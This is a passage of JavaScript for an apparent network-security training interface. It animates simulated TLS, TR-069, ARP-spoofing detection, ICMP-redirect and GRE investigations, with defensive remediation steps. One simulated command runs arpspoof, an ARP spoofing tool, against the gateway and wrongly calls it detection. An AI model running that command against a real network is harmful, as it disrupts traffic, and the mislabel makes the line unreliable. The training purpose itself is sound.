    const cipherName = host.querySelector('#tls-cipher-name');
    const version = host.querySelector('#tls-version');
    const ticket = host.querySelector('#tls-ticket');
    const kpiCert = host.querySelector('#tls-kpi-cert');
    const kpiDep = host.querySelector('#tls-kpi-dep');
    const kpiScore = host.querySelector('#tls-kpi-score');
    const proto11 = host.querySelector('#tls-proto-11');
    const proto10 = host.querySelector('#tls-proto-10');
    const depLbl = host.querySelector('#tls-dep-lbl');
    if (!phase) return;
    certs.forEach(c => c.className = 'fc-node');
    if (cipherLbl) cipherLbl.textContent = '--';
    if (cipherName) cipherName.textContent = '--';
    if (version) version.textContent = '--';
    if (ticket) ticket.textContent = '--';
    if (kpiCert) kpiCert.textContent = '0';
    if (kpiDep) kpiDep.textContent = '0';
    if (kpiScore) kpiScore.textContent = '--';
    if (proto11) proto11.style.display = 'none';
    if (proto10) proto10.style.display = 'none';
    if (depLbl) { depLbl.textContent = '--'; depLbl.style.color = ''; }
    phase.classList.remove('err');
    phase.textContent = '// idle — awaiting s_client';

    let t = 300;
    certs.forEach((c, i) => {
      timers.later(() => {
        c.classList.add('on');
        if (phase) phase.textContent = `// cert ${i + 1} verified — ${certMeta[i].subj}`;
        if (kpiCert) kpiCert.textContent = String(i + 1);
      }, t);
      t += 600;
    });
    timers.later(() => {
      certs.forEach(c => c.classList.add('done'));
      if (cipherName) cipherName.textContent = 'TLS_AES_256_GCM_SHA384';
      if (version) version.textContent = 'TLSv1.3';
      if (ticket) ticket.textContent = '04a3...8b21 (7200s)';
      if (cipherLbl) { cipherLbl.textContent = 'TLS 1.3 OK'; cipherLbl.style.color = 'var(--neon-2)'; }
      if (phase) phase.textContent = '// handshake complete — TLS_AES_256_GCM_SHA384 negotiated';
    }, t);
    t += 1000;
    timers.later(() => {
      if (proto11) proto11.style.display = 'block';
      if (proto10) proto10.style.display = 'block';
      if (kpiDep) kpiDep.textContent = '2';
      if (kpiScore) kpiScore.textContent = 'B';
      if (depLbl) { depLbl.textContent = 'TLSv1.0/1.1 OFFERED'; depLbl.style.color = 'var(--neon-3)'; }
      if (phase) { phase.innerHTML = '// <span class="err">DEPRECATED</span> — TLSv1.0 still offered'; phase.classList.add('err'); }
      certs.forEach(c => c.classList.add('hit'));
    }, t);
    t += 2200;
    timers.later(() => { phase.classList.remove('err'); phase.textContent = '// idle — awaiting next cycle'; }, t);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ---------- 8. TR-069 / CWMP — ACS↔CPE 6-RPC firmware push + Connection Request timeout ---------- */
function buildTR069Sim(skill, meta, lvl) {
  const slug = 'tr-069-cwmp';
  const rpcs = [
    { no: 1, name: 'Inform',              dir: 'cpe→acs', desc: 'CPE → ACS — boot event + cwmp:ID' },
    { no: 2, name: 'GetParameterValues',  dir: 'acs→cpe', desc: 'ACS reads SoftwareVersion, OUI' },
    { no: 3, name: 'SetParameterValues',  dir: 'acs→cpe', desc: 'ACS pushes FirmwareDownload URL' },
    { no: 4, name: 'Download',            dir: 'acs→cpe', desc: 'ACS issues Download RPC — image → CPE' },
    { no: 5, name: 'Reboot',              dir: 'acs→cpe', desc: 'CPE reboots after install' },
    { no: 6, name: 'ConnectionRequest',   dir: 'acs→cpe', desc: 'ACS pings CPE — TIMEOUT ✗' }
  ];
  const visual = `
    <div class="vs-stage" id="cwmp-stage" style="height:180px;overflow:hidden">
      <svg class="vs-svg"></svg>
      <span class="vs-stage-label">// TR-069/CWMP — ACS pushing firmware to CPE</span>
      <div class="vs-node" id="cwmp-acs" style="left:8%;top:50%;transform:translate(-50%,-50%)">
        <span class="vs-node-ico">🛠️</span><span class="vs-node-title">ACS</span>
        <span class="vs-node-sub">acs.isp.net:7547</span><span class="vs-led"></span>
      </div>
      <div class="vs-node" id="cwmp-cpe" style="left:80%;top:50%;transform:translate(-50%,-50%)">
        <span class="vs-node-ico">🖥️</span><span class="vs-node-title">CPE</span>
        <span class="vs-node-sub">192.168.1.1 (TR-181)</span><span class="vs-led"></span>
      </div>
      <div class="vs-phase-line" id="cwmp-phase">// idle — awaiting Inform</div>
    </div>
    <div class="pipeline-flow" id="cwmp-rpc-flow" style="flex-wrap:wrap;gap:6px;padding:8px">
      ${rpcs.map(r => `
        <div class="pl-step" id="cwmp-rpc-${r.no}">
          <span class="pl-no">${r.no}</span>
          <span class="pl-name">${r.name}</span>
          <span class="pl-state" style="display:block;font-size:9px">${r.dir}</span>
        </div>
      `).join('')}
    </div>
    <div class="siem-grid" style="margin-top:6px">
      <div class="siem-panel">
        <div class="siem-head"><span>// ACS console</span><span id="cwmp-state-lbl">--</span></div>
        <div class="term" id="cwmp-acs-console" style="font-size:10px;max-height:130px;overflow:auto;padding:6px"></div>
      </div>
      <div class="siem-panel">
        <div class="siem-head"><span>// connection request</span><span id="cwmp-cr-lbl">--</span></div>
        <div class="code-viewer" id="cwmp-cr-out" style="font-size:10px;padding:6px">
          <div class="sim-h">ACS → CPE Connection Request</div>
          <div>GET http://192.168.1.1:7547/?id=cr-cwmp</div>
          <div id="cwmp-cr-result" style="color:var(--neon-3);display:none">⚠ TIMEOUT after 30000 ms — CPE unreachable</div>
        </div>
      </div>
    </div>
  `;
  const lines = [
    `$ # ${skill.name} — advanced investigation @ ${ts()}`,
    '$ # multi-system investigation — produces a remediation proposal',
    '$ acsd --cpe 192.168.1.1 --user admin --push firmware-v2.4.1.bin',
    '[ACS] waiting for CPE Inform...',
    '2025-04-09 14:00:01 CPE Inform: ID=cwmp-1bb4 Event=1 BOOT',
    '   SoftwareVersion=2.3.0  OUI=001A2B  SN=SAGM0042',
    '[ACS] GetParameterValues → Device.ManagementServer.',
    '[ACS] SetParameterValues → Device.Software.DownloadImage=firmware-v2.4.1.bin',
    '[ACS] Download RPC dispatched — file://fw/v2.4.1.bin (4 MB)',
    '[CPE] DownloadProgress: 0/100',
    '[CPE] DownloadProgress: 47/100',
    '[CPE] DownloadProgress: 100/100 — apply',
    '[CPE] Reboot RPC received — install in progress',
    '[CPE] back online — SoftwareVersion=2.4.1',
    '[ACS] ConnectionRequest → http://192.168.1.1:7547/?id=cr-cwmp',
    '[!] TIMEOUT after 30000 ms — CPE 192.168.1.1 unreachable from ACS',
    '[ok] evidence captured: /tmp/cwmp-2025-047.log (12 KB)',
    '$ # Recommended remediation:',
    '$ #   1. Verify CPE STUN path — NAT pinhole may have closed',
    '$ #   2. Check CPE 7547/tcp is reachable from ACS subnet',
    '$ #   3. Re-validate the ConnectionRequestURL CPE parameter',
    '$ #   4. Enable periodic Inform (300s) to re-establish session'
  ];

  function animate(host, timers) {
    const stage = host.querySelector('#cwmp-stage');
    if (!stage) return;
    const svg = vsInitSvg(stage, 180);
    const acs = host.querySelector('#cwmp-acs');
    const cpe = host.querySelector('#cwmp-cpe');
    const phase = host.querySelector('#cwmp-phase');
    const rpcSteps = host.querySelectorAll('[id^="cwmp-rpc-"]');
    const consoleEl = host.querySelector('#cwmp-acs-console');
    const stateLbl = host.querySelector('#cwmp-state-lbl');
    const crLbl = host.querySelector('#cwmp-cr-lbl');
    const crResult = host.querySelector('#cwmp-cr-result');
    // reset
    if (consoleEl) consoleEl.innerHTML = '';
    if (stateLbl) { stateLbl.textContent = '--'; stateLbl.style.color = ''; }
    if (crLbl) { crLbl.textContent = '--'; crLbl.style.color = ''; }
    if (crResult) crResult.style.display = 'none';
    rpcSteps.forEach(s => s.className = 'pl-step');
    svg.querySelectorAll('*').forEach(n => n.remove());
    acs?.classList.remove('on', 'done', 'hit');
    cpe?.classList.remove('on', 'done', 'hit');
    phase.classList.remove('err');
    phase.textContent = '// idle — awaiting Inform';

    const link = vsLink(svg, 8, 50, 80, 50, 180, { packets: 0, color: 'var(--neon)', dur: 1.0, r: 3 });
    const consoleLines = [
      '[ACS] waiting for CPE Inform...',
      '[CPE] Inform: BOOT cwmp-1bb4 sw=2.3.0',
      '[ACS] GetParameterValues → MgmtServer',
      '[ACS] SetParameterValues → DownloadImage=v2.4.1',
      '[CPE] DownloadProgress: 100/100',
      '[CPE] Reboot — install complete',
      '[ACS] ConnectionRequest → 192.168.1.1:7547',
      '[!] TIMEOUT after 30000 ms'
    ];
    let ci = 0;
    let t = 300;
    rpcs.forEach((r, i) => {
      timers.later(() => {
        if (i === 0) { acs?.classList.add('on'); cpe?.classList.add('on'); link.activate(); }
        if (r.dir.startsWith('cpe')) link.packets(2, 'var(--neon)', 1.0, 3);
        else link.packets(2, 'var(--neon-2)', 1.0, 3);
        rpcSteps[i].className = 'pl-step running';
        if (phase) phase.textContent = `// RPC ${r.no} — ${r.name} (${r.dir})`;
        if (stateLbl) { stateLbl.textContent = r.name.toUpperCase(); stateLbl.style.color = ''; }
        if (consoleEl) {
          const ln = document.createElement('div'); ln.className = 'term-line';
          ln.textContent = consoleLines[Math.min(ci, consoleLines.length - 1)]; ci++;
          if (ln.textContent.includes('TIMEOUT')) ln.classList.add('term-err');
          else if (ln.textContent.includes('[CPE]')) ln.classList.add('term-ok');
          else if (ln.textContent.startsWith('[ACS]')) ln.classList.add('term-prompt');
          consoleEl.appendChild(ln); consoleEl.scrollTop = consoleEl.scrollHeight;
        }
      }, t);
      t += 1000;
      timers.later(() => {
        rpcSteps[i].className = 'pl-step ' + (i === rpcs.length - 1 ? 'fail' : 'pass');
      }, t);
    });
    timers.later(() => {
      if (crResult) crResult.style.display = 'block';
      if (crLbl) { crLbl.textContent = 'TIMEOUT'; crLbl.style.color = 'var(--neon-3)'; }
      cpe?.classList.add('hit');
      phase.innerHTML = '// <span class="err">CONNECTION REQUEST TIMEOUT</span> — CPE 192.168.1.1 unreachable';
      phase.classList.add('err');
    }, t + 300);
    timers.later(() => { phase.classList.remove('err'); phase.textContent = '// idle — awaiting next cycle'; }, t + 3000);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ---------- 9. ARP — 4-host LAN + gateway real/spoof + arpwatch flip detection ---------- */
function buildARPSim(skill, meta, lvl) {
  const slug = 'arp';
  const hosts = [
    { ip: '192.168.1.10', mac: 'aa:bb:cc:00:00:10', name: 'host-1' },
    { ip: '192.168.1.20', mac: 'aa:bb:cc:00:00:20', name: 'host-2' },
    { ip: '192.168.1.30', mac: 'aa:bb:cc:00:00:30', name: 'host-3' },
    { ip: '192.168.1.40', mac: 'aa:bb:cc:00:00:40', name: 'host-4' }
  ];
  const visual = `
    <div class="vs-stage" id="arp-stage" style="height:220px;overflow:hidden">
      <svg class="vs-svg"></svg>
      <span class="vs-stage-label">// ARP spoofing hunt — LAN 192.168.1.0/24 + arpwatch</span>
      <div class="vs-node" id="arp-gw-real" style="left:50%;top:18%;transform:translate(-50%,-50%)">
        <span class="vs-node-ico">🌐</span><span class="vs-node-title">GATEWAY (real)</span>
        <span class="vs-node-sub">192.168.1.1 · aa:bb:cc:dd:ee:ff</span><span class="vs-led"></span>
      </div>
      <div class="vs-node" id="arp-gw-fake" style="left:50%;top:82%;transform:translate(-50%,-50%);opacity:0;transition:opacity .4s">
        <span class="vs-node-ico">😈</span><span class="vs-node-title">SPOOFER</span>
        <span class="vs-node-sub">claims 192.168.1.1 · 00:11:22:33:44:55</span><span class="vs-led"></span>
      </div>
      ${hosts.map((h, i) => `
        <div class="vs-node" id="arp-host-${i}" style="left:${10 + i * 22}%;top:50%;transform:translate(-50%,-50%)">
          <span class="vs-node-ico">💻</span><span class="vs-node-title">${h.name.toUpperCase()}</span>
          <span class="vs-node-sub">${h.ip} · ${h.mac}</span><span class="vs-led"></span>
        </div>
      `).join('')}
      <div class="vs-phase-line" id="arp-phase">// idle — awaiting arpwatch</div>
    </div>
    <div class="siem-grid" style="margin-top:8px">
      <div class="siem-panel">
        <div class="siem-head"><span>// arpwatch — IP → MAC bindings</span><span id="arp-evt-cnt">0</span></div>
        <div class="siem-log-stream" id="arp-evt-stream" style="font-size:10px;max-height:140px"></div>
      </div>
      <div class="siem-panel">
        <div class="siem-head"><span>// arp -a output</span><span id="arp-spoof-lbl">--</span></div>
        <div class="code-viewer" id="arp-spoof-out" style="font-size:10px;padding:6px">
          <div>? (192.168.1.1) at aa:bb:cc:dd:ee:ff on eth0 ← real</div>
          <div id="arp-spoof-line" style="color:var(--neon-3);display:none">? (192.168.1.1) at 00:11:22:33:44:55 on eth0 ← SPOOF</div>
          <div>? (192.168.1.10) at aa:bb:cc:00:00:10 on eth0</div>
          <div>? (192.168.1.20) at aa:bb:cc:00:00:20 on eth0</div>
          <div class="kpi-strip" style="margin-top:6px">
            <div class="kpi-cell"><div class="kpi-val" id="arp-kpi-flip">0</div><div class="kpi-lbl">mac flips</div></div>
            <div class="kpi-cell"><div class="kpi-val" id="arp-kpi-real">1</div><div class="kpi-lbl">real gw mac</div></div>
            <div class="kpi-cell"><div class="kpi-val" id="arp-kpi-fake">0</div><div class="kpi-lbl">spoof mac</div></div>
          </div>
        </div>
      </div>
    </div>
  `;
  const lines = [
    `$ # ${skill.name} — advanced investigation @ ${ts()}`,
    '$ # multi-system investigation — produces a remediation proposal',
    '$ arpwatch -i eth0 -f /var/lib/arpwatch/arp.dat',
    '14:30:01.221 eth0 192.168.1.1 aa:bb:cc:dd:ee:ff gateway',
    '14:30:01.222 eth0 192.168.1.10 aa:bb:cc:00:00:10 host-1',
    '14:30:01.225 eth0 192.168.1.20 aa:bb:cc:00:00:20 host-2',
    '14:30:01.228 eth0 192.168.1.30 aa:bb:cc:00:00:30 host-3',
    '14:30:01.230 eth0 192.168.1.40 aa:bb:cc:00:00:40 host-4',
    '[!] 14:30:42.103 changed ethernet address 192.168.1.1',
    '   old: aa:bb:cc:dd:ee:ff (gateway, real)',
    '   new: 00:11:22:33:44:55 (UNKNOWN)',
    '[!] 14:30:42.121 2nd MAC answering for 192.168.1.1 — ARP SPOOFING',
    '$ arp -an',
    '? (192.168.1.1) at aa:bb:cc:dd:ee:ff [ether] on eth0',
    '? (192.168.1.10) at aa:bb:cc:00:00:10 [ether] on eth0',
    '? (192.168.1.20) at aa:bb:cc:00:00:20 [ether] on eth0',
    '$ sudo arpspoof -d 192.168.1.1  # detection, not attack',
    '[ok] evidence captured: /tmp/arp-2025-047.pcap (62 KB)',
    '$ # Recommended remediation:',
    '$ #   1. Enable Dynamic ARP Inspection (DAI) on access switches',
    '$ #   2. Bind 192.168.1.1 → aa:bb:cc:dd:ee:ff as static ARP entry',
    '$ #   3. Enable DHCP snooping trust DB — DAI source',
    '$ #   4. Port-security: limit 1 MAC per access port; shutdown 00:11:22:33:44:55'
  ];

  function animate(host, timers) {
    const stage = host.querySelector('#arp-stage');
    if (!stage) return;
    const svg = vsInitSvg(stage, 220);
    const gwReal = host.querySelector('#arp-gw-real');
    const gwFake = host.querySelector('#arp-gw-fake');
    const hostEls = host.querySelectorAll('[id^="arp-host-"]');
    const phase = host.querySelector('#arp-phase');
    const stream = host.querySelector('#arp-evt-stream');
    const evtCnt = host.querySelector('#arp-evt-cnt');
    const spoofLine = host.querySelector('#arp-spoof-line');
    const spoofLbl = host.querySelector('#arp-spoof-lbl');
    const kpiFlip = host.querySelector('#arp-kpi-flip');
    const kpiReal = host.querySelector('#arp-kpi-real');
    const kpiFake = host.querySelector('#arp-kpi-fake');
    // reset
    svg.querySelectorAll('*').forEach(n => n.remove());
    [gwReal, gwFake, ...hostEls].forEach(n => n?.classList.remove('on', 'done', 'hit'));
    if (gwFake) gwFake.style.opacity = '0';
    if (stream) stream.innerHTML = '';
    if (evtCnt) evtCnt.textContent = '0';
    if (spoofLine) spoofLine.style.display = 'none';
    if (spoofLbl) { spoofLbl.textContent = '--'; spoofLbl.style.color = ''; }
    if (kpiFlip) kpiFlip.textContent = '0';
    if (kpiReal) kpiReal.textContent = '1';
    if (kpiFake) kpiFake.textContent = '0';
    phase.classList.remove('err');
    phase.textContent = '// idle — awaiting arpwatch';

    // links: each host → gw-real (visible), each host → gw-fake (hidden initially)
    const linksToReal = [];
    const linksToFake = [];
    hostEls.forEach((h, i) => {
      linksToReal.push(vsLink(svg, 10 + i * 22, 50, 50, 18, 220, { packets: 0, color: 'var(--neon)', dur: 1.0, r: 3 }));
      linksToFake.push(vsLink(svg, 10 + i * 22, 50, 50, 82, 220, { packets: 0, color: 'var(--neon-3)', dur: 1.0, r: 3, hidden: true }));
    });

    const addEvt = (txt, cls) => {
      if (stream) {
        const c = parseInt(evtCnt?.textContent || '0', 10) + 1;
        if (evtCnt) evtCnt.textContent = String(c);
        const ln = document.createElement('span'); ln.className = 'siem-log-line ' + cls;
        ln.textContent = `${ts()} ${txt}`;
        stream.appendChild(ln);
        while (stream.children.length > 10) stream.removeChild(stream.firstChild);
      }
    };

    let t = 400;
    gwReal?.classList.add('on');
    hostEls.forEach((h, i) => {
      timers.later(() => {
        h.classList.add('on');
        linksToReal[i].activate();
        linksToReal[i].packets(2, 'var(--neon)', 1.0, 3);
        addEvt(`eth0 ${hosts[i].ip} ${hosts[i].mac} ${hosts[i].name}`, 'ok');
        if (phase) phase.textContent = `// host ${i + 1} up — ${hosts[i].ip} @ ${hosts[i].mac}`;
      }, t);
      t += 350;
    });
    timers.later(() => {
      addEvt('eth0 192.168.1.1 aa:bb:cc:dd:ee:ff gateway (real)', 'ok');
      if (phase) phase.textContent = '// gateway 192.168.1.1 = aa:bb:cc:dd:ee:ff (baseline)';
    }, t);
    t += 1200;
    // SPOOFING starts
    timers.later(() => {
      if (gwFake) gwFake.style.opacity = '1';
      gwFake?.classList.add('on', 'hit');
      if (spoofLine) spoofLine.style.display = 'block';
      if (spoofLbl) { spoofLbl.textContent = 'SPOOF DETECTED'; spoofLbl.style.color = 'var(--neon-3)'; }
      if (kpiFlip) kpiFlip.textContent = '1';
      if (kpiFake) kpiFake.textContent = '1';
      linksToFake.forEach((l, i) => { l.on(); l.packets(2, 'var(--neon-3)', 1.2, 3.5); hostEls[i]?.classList.add('hit'); });
      addEvt('CHANGED 192.168.1.1 aa:bb:cc:dd:ee:ff → 00:11:22:33:44:55', 'crit');
      if (phase) { phase.innerHTML = '// <span class="err">ARP SPOOFING</span> — 2nd MAC answering for 192.168.1.1'; phase.classList.add('err'); }
    }, t);
    t += 2400;
    timers.later(() => {
      phase.classList.remove('err');
      phase.textContent = '// idle — awaiting next cycle';
      if (gwFake) gwFake.style.opacity = '0';
    }, t);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ---------- 10. ICMP — ping -c 4 + traceroute -I + ICMP redirect MITM alert ---------- */
function buildICMPSim(skill, meta, lvl) {
  const slug = 'icmp';
  const visual = `
    <div class="vs-stage" id="icmp-stage" style="height:180px;overflow:hidden">
      <svg class="vs-svg"></svg>
      <span class="vs-stage-label">// ICMP diagnostics — ping / traceroute / redirect</span>
      <div class="vs-node" id="icmp-src" style="left:8%;top:50%;transform:translate(-50%,-50%)">
        <span class="vs-node-ico">💻</span><span class="vs-node-title">SRC</span>
        <span class="vs-node-sub">192.168.1.42</span><span class="vs-led"></span>
      </div>
      <div class="vs-node" id="icmp-gw" style="left:35%;top:25%;transform:translate(-50%,-50%)">
        <span class="vs-node-ico">🌐</span><span class="vs-node-title">GATEWAY</span>
        <span class="vs-node-sub">192.168.1.1</span><span class="vs-led"></span>
      </div>
      <div class="vs-node" id="icmp-mitm" style="left:35%;top:75%;transform:translate(-50%,-50%);opacity:.35;transition:opacity .4s">
        <span class="vs-node-ico">😈</span><span class="vs-node-title">HOST .42 (rogue)</span>
        <span class="vs-node-sub">non-gateway</span><span class="vs-led"></span>
      </div>
      <div class="vs-node" id="icmp-tgt" style="left:88%;top:50%;transform:translate(-50%,-50%)">
        <span class="vs-node-ico">☁️</span><span class="vs-node-title">8.8.8.8</span>
        <span class="vs-node-sub">dns.google</span><span class="vs-led"></span>
      </div>
      <div class="vs-phase-line" id="icmp-phase">// idle — awaiting ping</div>
    </div>
    <div class="siem-grid" style="margin-top:8px">
      <div class="siem-panel">
        <div class="siem-head"><span>// ping -c 4 + traceroute -I</span><span id="icmp-rtt-lbl">--</span></div>
        <div class="siem-log-stream" id="icmp-ping-stream" style="font-size:10px;max-height:160px"></div>
      </div>
      <div class="siem-panel">
        <div class="siem-head"><span>// ICMP redirect alert</span><span id="icmp-redir-lbl">--</span></div>
        <div class="code-viewer" style="font-size:10px;padding:6px">
          <div class="sim-h">tcpdump -i eth0 "icmp[0] == 5"</div>
          <div id="icmp-redir-line" style="color:var(--neon-3);display:none">⚠ ICMP redirect from 192.168.1.42 (non-gateway) — MITM attempt</div>
          <div class="kpi-strip" style="margin-top:6px">
            <div class="kpi-cell"><div class="kpi-val" id="icmp-kpi-pong">0</div><div class="kpi-lbl">pongs</div></div>
            <div class="kpi-cell"><div class="kpi-val" id="icmp-kpi-hops">0</div><div class="kpi-lbl">traceroute hops</div></div>
            <div class="kpi-cell"><div class="kpi-val" id="icmp-kpi-redir">0</div><div class="kpi-lbl">redirects</div></div>
          </div>
        </div>
      </div>
    </div>
  `;
  const lines = [
    `$ # ${skill.name} — advanced investigation @ ${ts()}`,
    '$ # multi-system investigation — produces a remediation proposal',
    `$ ping -c 4 8.8.8.8`,
    'PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.',
    '64 bytes from 8.8.8.8: icmp_seq=1 ttl=119 time=11.2 ms',
    '64 bytes from 8.8.8.8: icmp_seq=2 ttl=119 time=11.4 ms',
    '64 bytes from 8.8.8.8: icmp_seq=3 ttl=119 time=11.1 ms',
    '64 bytes from 8.8.8.8: icmp_seq=4 ttl=119 time=11.3 ms',
    '--- 8.8.8.8 ping statistics ---',
    '4 packets transmitted, 4 received, 0% packet loss, time 3005ms',
    'rtt min/avg/max/mdev = 11.1/11.25/11.4/0.1 ms',
    `$ traceroute -I -n 8.8.8.8`,
    ' 1  192.168.1.1     0.4 ms  (ICMP mode)',
    ' 2  10.0.0.1        4.1 ms',
    ' 3  172.16.0.1      7.9 ms',
    ' 4  80.81.82.1     11.2 ms',
    ' 5  8.8.8.8        11.3 ms',
    '[!] ICMP redirect detected from 192.168.1.42 (non-gateway)',
    '$ tcpdump -i eth0 -n "icmp[0] == 5" -c 5',
    '14:42:11.221 IP 192.168.1.42 > 192.168.1.10: ICMP redirect,',
    '   gw 192.168.1.42 dst 8.8.8.8, use 192.168.1.42 as next hop',
    '[!] MITM attempt — non-gateway host injecting redirect',
    '[ok] evidence captured: /tmp/icmp-2025-047.pcap (38 KB)',
    '$ # Recommended remediation:',
    '$ #   1. Disable ICMP redirect acceptance:',
    '$ #      sysctl net.ipv4.conf.all.accept_redirects=0',
    '$ #   2. Block at host firewall:',
    '$ #      iptables -A INPUT -p icmp --icmp-type 5 -j DROP',
    '$ #   3. Investigate 192.168.1.42 — possible MITM proxy',
    '$ #   4. Switch port-security: identify device behind .42'
  ];

  function animate(host, timers) {
    const stage = host.querySelector('#icmp-stage');
    if (!stage) return;
    const svg = vsInitSvg(stage, 180);
    const src = host.querySelector('#icmp-src');
    const gw = host.querySelector('#icmp-gw');
    const mitm = host.querySelector('#icmp-mitm');
    const tgt = host.querySelector('#icmp-tgt');
    const phase = host.querySelector('#icmp-phase');
    const stream = host.querySelector('#icmp-ping-stream');
    const rttLbl = host.querySelector('#icmp-rtt-lbl');
    const redirLine = host.querySelector('#icmp-redir-line');
    const redirLbl = host.querySelector('#icmp-redir-lbl');
    const kpiPong = host.querySelector('#icmp-kpi-pong');
    const kpiHops = host.querySelector('#icmp-kpi-hops');
    const kpiRedir = host.querySelector('#icmp-kpi-redir');
    // reset
    svg.querySelectorAll('*').forEach(n => n.remove());
    [src, gw, mitm, tgt].forEach(n => n?.classList.remove('on', 'done', 'hit'));
    if (mitm) mitm.style.opacity = '.35';
    if (stream) stream.innerHTML = '';
    if (rttLbl) { rttLbl.textContent = '--'; rttLbl.style.color = ''; }
    if (redirLine) redirLine.style.display = 'none';
    if (redirLbl) { redirLbl.textContent = '--'; redirLbl.style.color = ''; }
    if (kpiPong) kpiPong.textContent = '0';
    if (kpiHops) kpiHops.textContent = '0';
    if (kpiRedir) kpiRedir.textContent = '0';
    phase.classList.remove('err');
    phase.textContent = '// idle — awaiting ping';

    const srcGw = vsLink(svg, 8, 50, 35, 25, 180, { packets: 0, color: 'var(--neon)', dur: 1.0, r: 3 });
    const gwTgt = vsLink(svg, 35, 25, 88, 50, 180, { packets: 0, color: 'var(--neon-2)', dur: 1.0, r: 3, pts: [[60, 25], [80, 35]] });
    const srcMitm = vsLink(svg, 8, 50, 35, 75, 180, { packets: 0, color: 'var(--neon-3)', dur: 1.0, r: 3, hidden: true });

    const addPkt = (txt, cls) => {
      if (stream) {
        const ln = document.createElement('span'); ln.className = 'siem-log-line ' + cls;
        ln.textContent = `${ts()} ${txt}`;
        stream.appendChild(ln);
        while (stream.children.length > 12) stream.removeChild(stream.firstChild);
      }
    };

    let t = 400;
    src?.classList.add('on'); gw?.classList.add('on'); tgt?.classList.add('on');
    srcGw.activate(); gwTgt.activate();
    addPkt('$ ping -c 4 8.8.8.8', 'info');
    for (let i = 1; i <= 4; i++) {
      const rtt = (11.1 + Math.random() * 0.3).toFixed(1);
      timers.later(() => {
        srcGw.packets(2, 'var(--neon)', 1.0, 3);
        gwTgt.packets(2, 'var(--neon-2)', 1.0, 3);
        addPkt(`64 bytes from 8.8.8.8: icmp_seq=${i} ttl=119 time=${rtt} ms`, 'ok');
        if (rttLbl) rttLbl.textContent = rtt + ' ms';
        if (kpiPong) kpiPong.textContent = String(i);
        if (phase) phase.textContent = `// ping #${i} — RTT ${rtt} ms`;
      }, t);
      t += 600;
    }
    // traceroute
    const hops = [
      { n: 1, ip: '192.168.1.1', rtt: 0.4 },
      { n: 2, ip: '10.0.0.1',    rtt: 4.1 },
      { n: 3, ip: '172.16.0.1',  rtt: 7.9 },
      { n: 4, ip: '80.81.82.1',  rtt: 11.2 },
      { n: 5, ip: '8.8.8.8',     rtt: 11.3 }
    ];
    timers.later(() => addPkt('$ traceroute -I -n 8.8.8.8', 'info'), t); t += 200;
    hops.forEach((h, i) => {
      timers.later(() => {
        srcGw.packets(2, 'var(--neon-2)', 1.0, 3);
        gwTgt.packets(2, 'var(--neon-2)', 1.0, 3);
        addPkt(` ${h.n}  ${h.ip}     ${h.rtt} ms  (ICMP mode)`, 'ok');
        if (kpiHops) kpiHops.textContent = String(i + 1);
        if (phase) phase.textContent = `// traceroute hop ${h.n} — ${h.ip}`;
      }, t);
      t += 500;
    });
    // ICMP redirect attack
    timers.later(() => {
      if (mitm) mitm.style.opacity = '1';
      mitm?.classList.add('on', 'hit');
      srcMitm.on();
      srcMitm.packets(3, 'var(--neon-3)', 1.0, 3.5);
      if (redirLine) redirLine.style.display = 'block';
      if (redirLbl) { redirLbl.textContent = 'MITM REDIRECT'; redirLbl.style.color = 'var(--neon-3)'; }
      if (kpiRedir) kpiRedir.textContent = '1';
      addPkt('ICMP redirect from 192.168.1.42 (non-gateway) — MITM attempt', 'crit');
      if (phase) { phase.innerHTML = '// <span class="err">MITM</span> — ICMP redirect from 192.168.1.42'; phase.classList.add('err'); }
    }, t);
    t += 2200;
    timers.later(() => {
      phase.classList.remove('err');
      phase.textContent = '// idle — awaiting next cycle';
      if (mitm) mitm.style.opacity = '.35';
    }, t);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ---------- 11. GRE — site-to-site tunnel + ip tunnel/addr/link + MTU fragmentation ---------- */
function buildGRESim(skill, meta, lvl) {
  const slug = 'gre';
  const visual = `
    <div class="vs-stage" id="gre-stage" style="height:200px;overflow:hidden">
      <svg class="vs-svg"></svg>
      <span class="vs-stage-label">// GRE tunnel site A ↔ site B — MTU fragmentation watch</span>
      <div class="vs-node" id="gre-site-a" style="left:8%;top:30%;transform:translate(-50%,-50%)">
        <span class="vs-node-ico">🏢</span><span class="vs-node-title">SITE A</span>
        <span class="vs-node-sub">10.0.0.1 (wan) · 172.16.0.1/30 (gre1)</span><span class="vs-led"></span>
      </div>
      <div class="vs-node" id="gre-tun" style="left:50%;top:30%;transform:translate(-50%,-50%)">
        <span class="vs-node-ico">🕳️</span><span class="vs-node-title">gre1 tunnel</span>
        <span class="vs-node-sub">ttl 64 · key 0x1</span><span class="vs-led"></span>
      </div>
      <div class="vs-node" id="gre-site-b" style="left:88%;top:30%;transform:translate(-50%,-50%)">
        <span class="vs-node-ico">🏢</span><span class="vs-node-title">SITE B</span>
        <span class="vs-node-sub">10.0.0.2 (wan) · 172.16.0.2/30 (gre1)</span><span class="vs-led"></span>
      </div>
      <div class="vs-node" id="gre-host-a" style="left:8%;top:75%;transform:translate(-50%,-50%)">
        <span class="vs-node-ico">💻</span><span class="vs-node-title">host A</span>
        <span class="vs-node-sub">192.168.10.10</span><span class="vs-led"></span>
      </div>
      <div class="vs-node" id="gre-host-b" style="left:88%;top:75%;transform:translate(-50%,-50%)">
        <span class="vs-node-ico">💻</span><span class="vs-node-title">host B</span>
        <span class="vs-node-sub">192.168.20.10</span><span class="vs-led"></span>
      </div>
      <div class="vs-phase-line" id="gre-phase">// idle — awaiting ip tunnel add</div>
    </div>
    <div class="vs-steps" id="gre-steps">
      <div class="vs-step pending"><span class="vs-step-ico">1️⃣</span><span class="vs-step-body"><b>ip tunnel add</b> — gre1 mode gre remote 10.0.0.2 local 10.0.0.1 ttl 64</span><span class="vs-step-state">QUEUED</span></div>
      <div class="vs-step pending"><span class="vs-step-ico">2️⃣</span><span class="vs-step-body"><b>ip addr add</b> — 172.16.0.1/30 dev gre1</span><span class="vs-step-state">QUEUED</span></div>
      <div class="vs-step pending"><span class="vs-step-ico">3️⃣</span><span class="vs-step-body"><b>ip link set</b> — gre1 up</span><span class="vs-step-state">QUEUED</span></div>
      <div class="vs-step pending"><span class="vs-step-ico">4️⃣</span><span class="vs-step-body"><b>traffic flow</b> — host A → host B over gre1</span><span class="vs-step-state">QUEUED</span></div>
